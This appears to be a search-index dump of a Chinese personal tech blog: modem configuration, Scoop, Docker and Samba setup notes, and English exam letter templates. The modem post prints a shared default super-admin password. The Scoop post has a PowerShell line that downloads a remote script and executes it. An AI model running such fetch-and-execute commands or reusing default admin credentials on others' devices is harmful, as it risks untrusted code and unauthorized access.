[{"title":"移动光猫GM219-S","url":"https://littleghost2016.github.io/2020/03/31/移动光猫GM219-S/","content":"<p>没用移动之前听家人说100M网速，还想着挺快的，用了之后才知道什么叫真正的“墙内墙”…</p>\n<h1 id=\"光猫型号\"><a href=\"#光猫型号\" class=\"headerlink\" title=\"光猫型号\"></a>光猫型号</h1><p><code>GM219-S</code></p>\n<h1 id=\"用户名密码\"><a href=\"#用户名密码\" class=\"headerlink\" title=\"用户名密码\"></a>用户名密码</h1><h2 id=\"超级账户\"><a href=\"#超级账户\" class=\"headerlink\" title=\"超级账户\"></a>超级账户</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">CMCCAdmin</span><br><span class=\"line\">aDm8H%MdA</span><br></pre></td></tr></table></figure>\n\n<p>不同光猫可能超级账户的密码不同，具体可百度以后多试几个。</p>\n<h2 id=\"普通用户\"><a href=\"#普通用户\" class=\"headerlink\" title=\"普通用户\"></a>普通用户</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">user</span><br><span class=\"line\">[自行查看光猫底部]</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"超级账户配置\"><a href=\"#超级账户配置\" class=\"headerlink\" title=\"超级账户配置\"></a>超级账户配置</h1><p><em>前提：最好准备两个浏览器（如一个chrome和一个edge），因为要登录两个账户分别进行配置的更改和使用，一个浏览器不太方便，当然非必须。</em></p>\n<p>首先，使用超级账户更改网络连接配置，[网络]-[Internet连接]-[宽带设置]，以下为自用配置备份。</p>\n<h2 id=\"桥模式\"><a href=\"#桥模式\" class=\"headerlink\" title=\"桥模式\"></a>桥模式</h2><p>即桥接模式，光猫起到接受光信号的作用，由下级路由器或其它设备进行PPPoE拨号。</p>\n<h3 id=\"IP协议版本\"><a href=\"#IP协议版本\" class=\"headerlink\" title=\"IP协议版本\"></a>IP协议版本</h3><ul>\n<li>IPv4</li>\n<li>IPv6</li>\n<li>IPv4/v6</li>\n</ul>\n<p>不用多解释，需要哪个就选哪个。</p>\n<h3 id=\"使能\"><a href=\"#使能\" class=\"headerlink\" title=\"使能\"></a>使能</h3><p>是否启用此连接。</p>\n<h3 id=\"端口绑定\"><a href=\"#端口绑定\" class=\"headerlink\" title=\"端口绑定\"></a>端口绑定</h3><p>与光猫的LAN口进行绑定，被勾选上的LAN口使用此连接配置。</p>\n<h3 id=\"DHCP服务使能\"><a href=\"#DHCP服务使能\" class=\"headerlink\" title=\"DHCP服务使能\"></a>DHCP服务使能</h3><p>默认勾选。</p>\n<h3 id=\"桥模式-1\"><a href=\"#桥模式-1\" class=\"headerlink\" title=\"桥模式\"></a>桥模式</h3><p>IP_BRIDGE</p>\n<h3 id=\"业务类型\"><a href=\"#业务类型\" class=\"headerlink\" title=\"业务类型\"></a>业务类型</h3><ul>\n<li>INTERNET：使用互联网，就是最普通的上网</li>\n<li>OTHER：其他业务，如网络电视功能</li>\n</ul>\n<h3 id=\"VLAN模式\"><a href=\"#VLAN模式\" class=\"headerlink\" title=\"VLAN模式\"></a>VLAN模式</h3><ul>\n<li>改写（tag）：划分VLAN</li>\n</ul>\n<h3 id=\"VLAN-ID\"><a href=\"#VLAN-ID\" class=\"headerlink\" title=\"VLAN ID\"></a>VLAN ID</h3><p>200</p>\n<p><em>此处应向移动咨询，对于不同的业务（如INTERNET和OTHER对应于不同的VLAN ID），填错可能不能正常使用，也推荐自己记住自己家的这些ID。</em></p>\n<h3 id=\"802-1p\"><a href=\"#802-1p\" class=\"headerlink\" title=\"802.1p\"></a>802.1p</h3><p>6</p>\n<p><em>此项不清楚什么作用。</em></p>\n<h3 id=\"使能DSCP\"><a href=\"#使能DSCP\" class=\"headerlink\" title=\"使能DSCP\"></a>使能DSCP</h3><p>默认不勾选</p>\n<p><em>不清楚</em>。</p>\n<h3 id=\"DSCP\"><a href=\"#DSCP\" class=\"headerlink\" title=\"DSCP\"></a>DSCP</h3><p>不填</p>\n<p><em>不清楚</em>。</p>\n<h3 id=\"自用配置截图\"><a href=\"#自用配置截图\" class=\"headerlink\" title=\"自用配置截图\"></a>自用配置截图</h3><p><img src=\"%E6%A1%A5%E6%A8%A1%E5%BC%8F.png\" alt></p>\n<h2 id=\"PPPoE\"><a href=\"#PPPoE\" class=\"headerlink\" title=\"PPPoE\"></a>PPPoE</h2><p>使用光猫进行拨号。此时可没有下级路由器，或下级路由器仅作为AP而不使用其拨号功能。</p>\n<h3 id=\"MTU\"><a href=\"#MTU\" class=\"headerlink\" title=\"MTU\"></a>MTU</h3><p>1492</p>\n<p>默认值</p>\n<h3 id=\"用户名\"><a href=\"#用户名\" class=\"headerlink\" title=\"用户名\"></a>用户名</h3><p>PPPoE拨号用户名，不知道的话请咨询移动。</p>\n<h3 id=\"密码\"><a href=\"#密码\" class=\"headerlink\" title=\"密码\"></a>密码</h3><p>PPPoE拨号密码，不知道的话请咨询移动。</p>\n<h3 id=\"全局地址获取方式、网关获取方式、DNS获取方式\"><a href=\"#全局地址获取方式、网关获取方式、DNS获取方式\" class=\"headerlink\" title=\"全局地址获取方式、网关获取方式、DNS获取方式\"></a>全局地址获取方式、网关获取方式、DNS获取方式</h3><p>SLAAC</p>\n<h3 id=\"前缀获取方式\"><a href=\"#前缀获取方式\" class=\"headerlink\" title=\"前缀获取方式\"></a>前缀获取方式</h3><p>DHCPv6</p>\n<h3 id=\"以后可能用到的配置截图\"><a href=\"#以后可能用到的配置截图\" class=\"headerlink\" title=\"以后可能用到的配置截图\"></a>以后可能用到的配置截图</h3><p><img src=\"PPPoE.png\" alt></p>\n<h2 id=\"VOIP\"><a href=\"#VOIP\" class=\"headerlink\" title=\"VOIP\"></a>VOIP</h2><p>网络电话，我家应该是没有办理这个服务，所以无法使用</p>\n<h3 id=\"VLAN-ID-1\"><a href=\"#VLAN-ID-1\" class=\"headerlink\" title=\"VLAN ID\"></a>VLAN ID</h3><p>300</p>\n<h3 id=\"以后可能用到的配置截图-1\"><a href=\"#以后可能用到的配置截图-1\" class=\"headerlink\" title=\"以后可能用到的配置截图\"></a>以后可能用到的配置截图</h3><p><img src=\"VOIP.png\" alt></p>\n<h2 id=\"网络电视\"><a href=\"#网络电视\" class=\"headerlink\" title=\"网络电视\"></a>网络电视</h2><h3 id=\"VLAN-ID-2\"><a href=\"#VLAN-ID-2\" class=\"headerlink\" title=\"VLAN ID\"></a>VLAN ID</h3><p>400</p>\n<h3 id=\"802-1p-1\"><a href=\"#802-1p-1\" class=\"headerlink\" title=\"802.1p\"></a>802.1p</h3><p>4</p>\n<h3 id=\"用到的配置截图\"><a href=\"#用到的配置截图\" class=\"headerlink\" title=\"用到的配置截图\"></a>用到的配置截图</h3><p><img src=\"OTHER.png\" alt></p>\n<h2 id=\"TR069\"><a href=\"#TR069\" class=\"headerlink\" title=\"TR069\"></a>TR069</h2><p>这个我也不懂，我的光猫里面有，也顺便记录一下吧…</p>\n<h3 id=\"VLAN-ID-3\"><a href=\"#VLAN-ID-3\" class=\"headerlink\" title=\"VLAN ID\"></a>VLAN ID</h3><p>1000</p>\n<h3 id=\"802-1p-2\"><a href=\"#802-1p-2\" class=\"headerlink\" title=\"802.1p\"></a>802.1p</h3><p>7</p>\n<h3 id=\"以后可能用到的配置截图-2\"><a href=\"#以后可能用到的配置截图-2\" class=\"headerlink\" title=\"以后可能用到的配置截图\"></a>以后可能用到的配置截图</h3><p><img src=\"TR069.png\" alt></p>\n<h1 id=\"user账户配置\"><a href=\"#user账户配置\" class=\"headerlink\" title=\"user账户配置\"></a>user账户配置</h1><p>选择已经使用超级用户配置好了的选项，使用路由器拨号后即可网上冲浪了。</p>\n","categories":["技术"],"tags":["移动","光猫"]},{"title":"如何选择开源协议","url":"https://littleghost2016.github.io/2020/03/30/如何选择开源协议/","content":"<p>图片转自<a href=\"https://blog.csdn.net/wadefelix/article/details/6384317\" target=\"_blank\" rel=\"noopener\">如何选择开源许可证？</a></p>\n<p><img src=\"Licence%E9%80%89%E6%8B%A9.png\" alt></p>\n","categories":["技术"],"tags":["git"]},{"title":"使用scoop","url":"https://littleghost2016.github.io/2020/03/28/使用scoop/","content":"<h1 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h1><h2 id=\"允许本地脚本执行\"><a href=\"#允许本地脚本执行\" class=\"headerlink\" title=\"允许本地脚本执行\"></a>允许本地脚本执行</h2><figure class=\"highlight powershell\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ <span class=\"built_in\">set-executionpolicy</span> remotesigned -scope currentuser</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"自定义scoop安装路径\"><a href=\"#自定义scoop安装路径\" class=\"headerlink\" title=\"自定义scoop安装路径\"></a>自定义scoop安装路径</h2><figure class=\"highlight powershell\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ [environment]::setEnvironmentVariable(<span class=\"string\">'SCOOP'</span>,<span class=\"string\">'D:\\scoop'</span>,<span class=\"string\">'User'</span>)</span><br><span class=\"line\">$ <span class=\"variable\">$env:SCOOP</span>=<span class=\"string\">'D:\\scoop'</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"执行安装脚本\"><a href=\"#执行安装脚本\" class=\"headerlink\" title=\"执行安装脚本\"></a>执行安装脚本</h2><figure class=\"highlight powershell\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ iex (<span class=\"built_in\">new-object</span> net.webclient).downloadstring(<span class=\"string\">'https://get.scoop.sh'</span>)</span><br></pre></td></tr></table></figure>\n\n","categories":["技术"],"tags":["scoop"]},{"title":"树莓派使用docker","url":"https://littleghost2016.github.io/2020/01/24/树莓派使用docker/","content":"<h1 id=\"解决Got-permission-denied问题\"><a href=\"#解决Got-permission-denied问题\" class=\"headerlink\" title=\"解决Got permission denied问题\"></a>解决Got permission denied问题</h1><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo groupadd docker\t\t\t\t<span class=\"comment\">#添加docker用户组</span></span><br><span class=\"line\">$ sudo gpasswd -a <span class=\"variable\">$USER</span> docker\t\t<span class=\"comment\">#将登陆用户加入到docker用户组中</span></span><br><span class=\"line\">$ newgrp docker\t\t\t\t\t\t<span class=\"comment\">#更新用户组</span></span><br><span class=\"line\">$ docker ps</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"配置国内镜像源\"><a href=\"#配置国内镜像源\" class=\"headerlink\" title=\"配置国内镜像源\"></a>配置国内镜像源</h1><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo vim /etc/docker/daemon.json</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;registry-mirrors&quot;: [</span><br><span class=\"line\">    &quot;https://dockerhub.azk8s.cn&quot;,</span><br><span class=\"line\">    &quot;https://hub-mirror.c.163.com&quot;</span><br><span class=\"line\">  ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo systemctl daemon-reload</span><br><span class=\"line\">$ sudo systemctl restart docker.service</span><br></pre></td></tr></table></figure>\n\n","categories":["技术"],"tags":["树莓派","docker"]},{"title":"树莓派搭建smb","url":"https://littleghost2016.github.io/2020/01/20/树莓派搭建smb/","content":"<blockquote>\n<p>  <del>很简单，有手就行。</del></p>\n</blockquote>\n<h1 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h1><ol>\n<li>安装二进制文件</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo apt install samba</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>修改配置文件</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo vim /etc/samba/smb.conf</span><br></pre></td></tr></table></figure>\n\n<p>最后添加如下内容。<em>path为共享文件夹的路径，请根据自身情况修改</em></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[share]</span><br><span class=\"line\">comment = Personal SMB server</span><br><span class=\"line\">path = /home/ubuntu/sambaDirectory</span><br><span class=\"line\">public = no</span><br><span class=\"line\">writable = yes</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>重启<code>samba</code>服务</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo systemctl restart smbd.service</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>为<code>samba</code>配置新用户</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo pdbedit -a -u ubuntu</span><br></pre></td></tr></table></figure>\n\n<p>输入两遍密码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">new password:</span><br><span class=\"line\">retype new password:</span><br></pre></td></tr></table></figure>\n\n<p>最后的回显</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Unix username:        ubuntu</span><br><span class=\"line\">NT username:</span><br><span class=\"line\">Account Flags:        [U          ]</span><br><span class=\"line\">User SID:             S-1-5-21-3656490077-3147567822-1491380157-1000</span><br><span class=\"line\">Primary Group SID:    S-1-5-21-3656490077-3147567822-1491380157-513</span><br><span class=\"line\">Full Name:            Ubuntu</span><br><span class=\"line\">Home Directory:       \\\\ubuntu\\ubuntu</span><br><span class=\"line\">HomeDir Drive:</span><br><span class=\"line\">Logon Script:</span><br><span class=\"line\">Profile Path:         \\\\ubuntu\\ubuntu\\profile</span><br><span class=\"line\">Domain:               UBUNTU</span><br><span class=\"line\">Account desc:</span><br><span class=\"line\">Workstations:</span><br><span class=\"line\">Munged dial:</span><br><span class=\"line\">Logon time:           0</span><br><span class=\"line\">Logoff time:          Wed, 06 Feb 2036 15:06:39 UTC</span><br><span class=\"line\">Kickoff time:         Wed, 06 Feb 2036 15:06:39 UTC</span><br><span class=\"line\">Password last set:    Mon, 20 Jan 2020 01:54:24 UTC</span><br><span class=\"line\">Password can change:  Mon, 20 Jan 2020 01:54:24 UTC</span><br><span class=\"line\">Password must change: never</span><br><span class=\"line\">Last bad password   : 0</span><br><span class=\"line\">Bad password count  : 0</span><br><span class=\"line\">Logon hours         : FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h1><ol>\n<li><p>Windows文件资源管理器输入<code>\\\\{树莓派IP}\\share</code></p>\n</li>\n<li><p>输入刚刚设置的<code>samba</code>用户名和密码，进入共享文件夹。</p>\n</li>\n</ol>\n<h1 id=\"关于pdbedit\"><a href=\"#关于pdbedit\" class=\"headerlink\" title=\"关于pdbedit\"></a>关于pdbedit</h1><p><code>pdbedit</code>是<code>samba</code>的用户管理命令</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">主要参数</th>\n<th align=\"center\">作用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">-L, –list</td>\n<td align=\"center\">list all users</td>\n</tr>\n<tr>\n<td align=\"center\">-v, –verbose</td>\n<td align=\"center\">详细信息</td>\n</tr>\n<tr>\n<td align=\"center\">-a, –create</td>\n<td align=\"center\">create user</td>\n</tr>\n<tr>\n<td align=\"center\">-r, –modify</td>\n<td align=\"center\">modify user</td>\n</tr>\n<tr>\n<td align=\"center\">-x, –delete</td>\n<td align=\"center\">delete user</td>\n</tr>\n</tbody></table>\n","categories":["技术"],"tags":["树莓派","smb"]},{"title":"英语作文模板","url":"https://littleghost2016.github.io/2019/12/29/英语作文模板/","content":"<blockquote>\n<p>Painstaking but rewarding. 艰苦卓绝但富有成效。</p>\n</blockquote>\n<p>本篇模板汇总内容为备战考研时的笔记，考研时用了感觉还不错。所有内容来自微博 <a href=\"http://weibo.com/u/6089373308\" target=\"_blank\" rel=\"noopener\">@薛非英语</a>，感谢您！</p>\n<p>内容整理自一年前，可能一些单词有些错误=.=|..</p>\n<h1 id=\"信件\"><a href=\"#信件\" class=\"headerlink\" title=\"信件\"></a>信件</h1><h3 id=\"信件格式\"><a href=\"#信件格式\" class=\"headerlink\" title=\"信件格式\"></a>信件格式</h3><ul>\n<li>Dear teacher</li>\n<li>Dear Mr. / Ms. 姓</li>\n<li>Dear 名</li>\n<li>Dear Sir/Madam 不辨雌雄</li>\n<li>Dear可替换为You Esteemed</li>\n<li>To whom It May concern 给相关人士，一般放在投诉信中</li>\n<li>Dear后面有 ,</li>\n<li>结尾处Yours sincerely后面也有,</li>\n<li>时间：月.日,年<ul>\n<li>Dec. 23, 2018</li>\n<li>注意五月May后面不需要加.</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"信件极简开头\"><a href=\"#信件极简开头\" class=\"headerlink\" title=\"信件极简开头\"></a>信件极简开头</h3><ul>\n<li>表明身份（不熟悉）：I’m XX + 定语. I’m writing the letter to do sth</li>\n<li>表明立场（熟悉）：I feel XX when I learned that …  I’m writing the letter to do sth</li>\n</ul>\n<h3 id=\"信件极简结尾\"><a href=\"#信件极简结尾\" class=\"headerlink\" title=\"信件极简结尾\"></a>信件极简结尾</h3><ul>\n<li>I’m full of gratitude for your taking time from your busy schedule and read my letter. I’m  looking forward to you (favorable) reply at your earliest convenience.</li>\n</ul>\n<h2 id=\"投诉信\"><a href=\"#投诉信\" class=\"headerlink\" title=\"投诉信\"></a>投诉信</h2><p>To Whom It May Concern,<br>    I am a [电子产品、日常用品] user of your <u>product / [食物]</u> cuntomer of your store / resident in XX community. I’m writing to inform you my dissatisfaction with <u>your product / your service / the noise</u>.<br>    The focus of my complaint is as follows: On the one hand, (三选一：[产品]the product has been found of poor quality / mutilated(残缺的) since the day I bought it; [服务]I had waited for an unbearably long time until I received the service / the package(包裹); [环境] have been tortured by the XX day and night for a long time). On the other, my previous repetitive(反复的) complaints seemed to have aroused little attention. I feel disappointed, so I demand that the problem (should) be solved as soon as possible.<br>    I would appreciate it if you could take this matter into serious consideration and make efforts to prevent it in the futur before I take further action. I’m looking forward to your early reply.<br>                yours sincerely,<br>                    Li Ming</p>\n<h2 id=\"邀请信\"><a href=\"#邀请信\" class=\"headerlink\" title=\"邀请信\"></a>邀请信</h2><p>Dear XXX,<br>    There will be a 活动 held by 举办单位. As you are a close friend of ours / an expert in this field, we would be pleased to have you join us as an honored guest(嘉宾) / a visting professor(客座教授) / a judeg(评委/裁判) of the contest.<br>    The activity will be held in 地点 at 时刻 on 日期, inluding the items as follows: First, we’ll conduct a discussion(整体意思为discuss) on some heated(热点的) / interesting / professional topics concerning XX / surfaced recently. Then we will enjoy an excellent show / contest / lecture(讲座) presented by some brilliant students / teachers. After that, we will go on to have a taste of some typical local delicacies(当地的美食) and feast(盛宴) our eyes on the spectacular scenery of our campus(学校). I’m sure we’ll have a good time then.<br>    I look forward to your favorable reply(肯定的答复), and your presence will bring us real(可替换special) honor. Please let us know your decision at your earliest convenience. Thank you for your time and consideration.<br>                Respectfully yours,<br>                    Li Ming</p>\n<ul>\n<li>举办单位<ul>\n<li>学生会 Students’ Union</li>\n<li>XX院 Department of XX</li>\n<li>XX协会 XX association / club</li>\n</ul>\n</li>\n<li>地点<ul>\n<li>gym</li>\n<li>auditorium 大礼堂</li>\n</ul>\n</li>\n<li>事件<ul>\n<li>graduation ceremony 毕业典礼</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"拒绝信-辞职信\"><a href=\"#拒绝信-辞职信\" class=\"headerlink\" title=\"拒绝信/辞职信\"></a>拒绝信/辞职信</h2><p>拒绝offer等要自我介绍以下；辞职需要</p>\n<p>Dear XXX,<br>    [拒绝信开头]I’m Li Ming writing on receipt of your letter on 日期. I really appreciate(感激) your cordial(=sincere) offer of the opsition as XXX.<br>    [辞职信开头]I’m Li Ming working as a XX in your company. I really appreciate the opportunity to have worked with such an extraordinary group.<br>    I’m quite reluctant(不情愿的) to inform you that I won’t be avaliable for the job / activity because recently I have been offered a chance to pursue further study in Harvard University, which I can by no means(绝不) afford to miss. What’s more, I found that this is not what my insterest lies in or I’m good at, so it would be unwise for me to keep on doing / accept it. Worse still, I was assigned(被指派) an urgent task in preparation for the 70th anniversary of our university, which deprives me of the time and energy to accept the offer / work for you.<br>    Again, I would like to apologize for having to decline your kind offer / resign from the post. I will you and XX company / university continued success in the future.<br>                Respectfully yours,<br>                    Li Ming</p>\n<h2 id=\"推荐信\"><a href=\"#推荐信\" class=\"headerlink\" title=\"推荐信\"></a>推荐信</h2><h3 id=\"推荐人\"><a href=\"#推荐人\" class=\"headerlink\" title=\"推荐人\"></a>推荐人</h3><p>You Esteemed XXX,<br>    In reply to your(公司) / sb’s request(受推荐的人), I am delighted to have the privilege to write the recommendation in honor of him / her.<br>    Several qualities, as far as I am concerned, make him / her an ideal candidate. First and foremost, during my work / study with sb, I was quite impressed by his inexhaustible innovation dieas and profound insight into the relevant field. What’s more, he always finishes his task with remarkable diligence and punctuality, a quite praiseworthy quality for the young generation, Last but not the least, I’m sure that he will adapt to the new environment soon because he is known to be an outgoing and cooperative person.<br>    I give him / her my highest recommendations without reservation and I am convinced that he / she will never let you down. I would be ready to answer any additional questions you may have.<br>                    Respectfully yours,<br>                        Li Ming</p>\n<ul>\n<li>deligence 贫乏</li>\n<li>diligence 勤奋/勤勉</li>\n</ul>\n<h3 id=\"推荐物\"><a href=\"#推荐物\" class=\"headerlink\" title=\"推荐物\"></a>推荐物</h3><p>Dear XXX,<br>    In reply to your request for recommending a book / movie / tourist attraction / special food / song / activity … of quality. I have great pleasure to introduce XXX.<br>    Several quslities, as far as I am concerned, account for why XX is on the top of my list. First and foremost, it boasts(骄傲地拥有) tremendous artistic / historical / academic / practical / nutritional value which can rarely be found in others of its kind. Plus, you can also get a glimpse(简要地瞅一眼) of XX(中国/建筑) culture after enjoying it because of its abundant native elements peculiar(特有的) to China / American … Still, it also helps to enlarge your circle of friends / practice your Chinese / English because you will definitely come across various people with sililar interests / idiomatic expressions（地道地表达） during the process.<br>    I give it my highest recommendations without reservation(保留) and I am sure that you will love it. I would be pleased to answer any additional questions you may have.<br>                    Respectfully yours,<br>                        Li Ming</p>\n<ul>\n<li>词汇<ul>\n<li>aesthetic 美学的</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"感谢信\"><a href=\"#感谢信\" class=\"headerlink\" title=\"感谢信\"></a>感谢信</h2><p>Dear XXX,<br>    (On behalf of XX, ) I’m writing this letter to express my heartfelt(sincere) gratitude（感激） for your proceless(弥足珍贵的) help during 某项活动(正事) / hospotality(热情款待：腐败) my stay in XX(地点).<br>    First and foremost, as a direct result of your efforts, I have been able to finish the task thoroughly. It was really kind of you to extend your assistance to me(向我伸出援手). / I was thrilled(开心) with(表原因) entertainment(娱乐，招待) you provided.Without your assistance, I’m afraid, I could not have achieved anything. What impressed me the most was your righteous(正直的), morality(美德) and cheerful personality(乐观的性格). You are really a gem of a person to know(您真是一个珠玉般的人).<br>    I hope I have the opportunity of reciprocating(报答). I will fell very honored and pleased if I can help / host you in the near future. I’m looking forward to meeting you next time.<br>                Yours sincerely,<br>                    Li Ming</p>\n<h3 id=\"一般范围\"><a href=\"#一般范围\" class=\"headerlink\" title=\"一般范围\"></a>一般范围</h3><ul>\n<li>正事：感谢帮助</li>\n<li>腐败：感谢招待</li>\n</ul>\n<h3 id=\"招待的等级\"><a href=\"#招待的等级\" class=\"headerlink\" title=\"招待的等级\"></a>招待的等级</h3><ul>\n<li>reception</li>\n<li>accommodation</li>\n<li>entertainment</li>\n</ul>\n<h2 id=\"道歉信\"><a href=\"#道歉信\" class=\"headerlink\" title=\"道歉信\"></a>道歉信</h2><p>Dear XX,<br>    I’m extremely sorry that 所要抱歉的事情. I am hereby(在此，兹) writing to you with some embarrassment and many apologies.<br>    There were several causes leading to the incident(偶然发生的事情) / my fault(我的错误). For a start, before I found the mistake / sth / the time was to limited …(无法参加会议等), I had been fully engaged in studying / doing an important task / packing my luggage. Thus, everything was to late when I realize what had happened. To make things worse, there was / were few people (buses) / too much traffic / too many people / too much work then and there, which also make it impossible for me to make it up(补救) immediately / apologize in person(当面). Although I tried everything I could, what was doen cannot be undone.<br>    I apologized for the trouble I caused to you and assure you that all possible steps will be taken to make it up and to avoid such mistakes happening again. I sincerely hope that you will be able to think in my shoes(理解我的处境) and accept my apology.<br>                Yours sincerely,<br>                    Li Ming</p>\n<h2 id=\"慰问信\"><a href=\"#慰问信\" class=\"headerlink\" title=\"慰问信\"></a>慰问信</h2><p>Dear XX,<br>    (熟悉的人不用自我介绍，不熟悉的说明我是XXX)It brings me great sorrow to hear of your misfortune. I got the news from XX, and know that it has taken its toll on you（你身上受到了伤害，让你付出了代价）.<br>    I know it is almost an intrusion(打扰，闯入) to write at a time like this, but I cannot help letting you know that I, as your frind, will be with you. I can imagine the terror(恐惧) / grief(悲伤) / frustration(挫败感) you must feel in such a catastrophe(巨大的灾难), but I hope you will overcome your mishap(灾祸) with your resolute spirit(决心). If there is anyone you need to turn to(向别人求助，需要帮助), I’ll be most willing to lend you my ear. Maybe it is also helpful to seek(寻找) for inner tranquility(内心的平静) from peaceful music and regain confidence from inspiring books. I’m sure you will be back on your feet(重新振作起来) in no time(=quickly).<br>    If there’s anything we can do for you, please feel easy to let us know. My love and thoughts are with you.<br>                Yours sincerely,<br>                    Li Ming</p>\n<h2 id=\"祝贺信\"><a href=\"#祝贺信\" class=\"headerlink\" title=\"祝贺信\"></a>祝贺信</h2><p><strong>考试通过，找到工作，升学</strong></p>\n<p>Dear XX,<br>    I’m so pleased to learn that …. Please accept my heartiest(最衷心的) congraduations and all good wishes on this milestone(里程碑) in your life.<br>    Having always appreciated(欣赏) your commitment(奉献) very much in XXX(学习，工作，研究),I firmly believe that it was only a matter of time before your efforts were rewarded(你的努力迟早会得到回报). Your success speaks well for(证实了) the truth that nothing is impossible for a willing heart(有志者事竟成). What’s more, I am also convinced that you will make greater contribution to the country if you stick to what you are doing, put it into practice(付诸实践), and share your experience with those who need it.<br>    May you enjoy many more triumphant(欢欣鼓舞的，成功的) days like this!<br>                Yours sincerely,<br>                    Li Ming</p>\n<blockquote>\n<p>May god be with you! 愿上帝与你同在!</p>\n<p>You have been admitted to / recruit by / enroll by XX 被XX录取</p>\n<p>[第一段]learn that you have make great break through in your work / study</p>\n</blockquote>\n<h2 id=\"介绍信\"><a href=\"#介绍信\" class=\"headerlink\" title=\"介绍信\"></a>介绍信</h2><h3 id=\"建筑机构\"><a href=\"#建筑机构\" class=\"headerlink\" title=\"建筑机构\"></a>建筑机构</h3><p>Dear XX,<br>    I am pleased to learn that you are going to be a mumber of us soon. On behalf of 某机构, I am writing to offer you some information about XX, which you may find useful in the foreseeable future(不久的将来).<br>    The xx is located in the center of your city / campus, with its office on the second floor of a white building. It consists of twenty memebers / a staff(工作人员) of twenty / 数目+sth, almost half of whom / which are from abroad. The function of the staff is analogous(类似于) to that of advisors(顾问), who are supposed to ensure desirable circumstances(理想的环境) for all and organize diverse activities. For more detailed information please check(=refer to 查询) the brochure(手册) attached to this letter.<br>    I hope you will find the abovementioned helped. I wish you joy and happiness during your stay here.<br>                Yours sincerely,<br>                    Li Ming</p>\n<ul>\n<li>assure sb</li>\n<li>ensure sth</li>\n</ul>\n<h3 id=\"课程章程\"><a href=\"#课程章程\" class=\"headerlink\" title=\"课程章程\"></a>课程章程</h3><p><strong>选修课、奖学金、留学项目</strong></p>\n<p>Dear XX,<br>    On receipt of your letter of inquiry, I’m delighted and honored to acquaint you with the information about XX (on behalf of 某机构).<br>    The association / award / scholarship / regulation / course is oriented(以…为导向) towards students of XX major /  from XX(remote) area / with a sound command(牢固的掌握) of 某专业  / difficulty in doing sth, and will provide them with technical / academic / financial support during their study / work. On the other hand, the letter shall(非常肯定地想要。如果前面是第一人称，则是应该) meet the rquirements as follows. First and foremost, they are supposed to be outstanding in their study(学习上足够优秀) / be in real need(真正的贫困). Plus, to ensure desirable result(良好的结果), the students concerned(相关的学生) are supposed to obey relevant（相关的） regulations and to finish the tasks punctually(准时地), or they would take punishment from the former(协会，奖学金等）.<br>    I hope you will find the abovementioned helpful. I wish you joy and happiness during your stay here.<br>                Yours sincerely,<br>                    Li Ming</p>\n<h2 id=\"申请信\"><a href=\"#申请信\" class=\"headerlink\" title=\"申请信\"></a>申请信</h2><p>Dear XX,<br>    I’m a student of 著名的学校, expecting to graduate with a Bachelor’s degree this summer. I’m writing to apply for the graduate program(研究生项目) of 学位 of 学校 beginning from fall, 2019 / position of XX as was advertised recently / scholarship for outstanding student in XX专业.<br>    (或者用推荐信的套路，把人称改一下)<br>    Several Factors, I believe, qualify me for the program / scholarship, Firstly, attached please find my resume(随信附上我的简历) which further expatiates(详细叙述) on my academic attainments(学术造诣) and working experience. What’s more, as XX(例如对方的学校等) enjoys remarkable international renown, it has long been a dream of mime to become a member of it. Besides, that I find great interest in the relevant field(对相关领域产生兴趣) also makes me a competent(有能力的) candidate for it. After all, interest if the best teacher.<br>    Thank you for taking time from your busy schedule to read my application, and I would appreciate an opportuity for an interview with you. I’m looking forward to your favorable(称赞的，讨人喜欢的) reply.<br>                Yours sincerely,<br>                    Li Ming</p>\n<ul>\n<li>学位<ul>\n<li>Bachelor’s degree</li>\n<li>Master’ ~</li>\n<li>Doctor’s ~</li>\n</ul>\n</li>\n<li>apply<ul>\n<li>apply to a foreign university for admission</li>\n<li>apply to 对象</li>\n<li>apply for 东西</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"建议信\"><a href=\"#建议信\" class=\"headerlink\" title=\"建议信\"></a>建议信</h2><h3 id=\"个人\"><a 